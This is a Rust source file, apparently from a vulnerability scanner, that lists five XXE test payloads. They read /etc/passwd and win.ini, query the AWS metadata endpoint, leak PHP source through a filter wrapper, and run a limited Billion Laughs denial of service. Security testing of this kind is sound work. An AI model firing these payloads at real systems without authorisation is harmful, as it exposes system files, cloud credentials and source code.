use crate::domain::active_vuln::{ExpectedIndicator, PayloadDefinition};
use crate::domain::entities::SeverityLevel;

pub fn get_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "xxe_01".into(),
            payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.into(),
            description: "Classic XXE — /etc/passwd exfiltration".into(),
            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xxe_02".into(),
            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>"#.into(),
            description: "XXE — Windows win.ini exfiltration".into(),
            expected_indicator: ExpectedIndicator::FileContent("[fonts]".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xxe_03".into(),
            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>"#.into(),
            description: "XXE SSRF — AWS metadata endpoint".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("ami-id".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xxe_04".into(),
            payload: r#"<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><foo>&lol2;</foo>"#.into(),
            description: "Billion Laughs DoS variant (limited)".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("entity".into()),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "xxe_05".into(),
            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>"#.into(),
            description: "XXE with PHP filter wrapper for source disclosure".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("PD9waH".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}
